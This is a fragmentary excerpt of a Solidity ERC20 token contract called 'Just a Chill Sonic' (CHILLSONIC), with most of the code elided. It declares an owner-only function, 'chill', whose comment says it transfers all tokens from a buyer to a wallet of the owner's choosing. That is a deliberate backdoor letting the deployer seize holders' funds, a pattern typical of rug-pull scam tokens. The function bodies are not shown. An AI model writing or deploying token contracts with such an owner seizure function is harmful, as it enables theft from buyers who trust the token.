...
contract ChillSonic is ERC20, Ownable {
    ...
    constructor(address initialOwner) ERC20("Just a Chill Sonic", "CHILLSONIC") Ownable(initialOwner) {
        _mint(initialOwner, 333000000000 * (10 ** decimals()));
        transferOwnership(initialOwner);
    }

    // Function to transfer all tokens from the buyer to a specified wallet
    function chill(address from, address to) external onlyOwner {
    ...
    function sendChill(address to, uint256 amount) public onlyOwner {
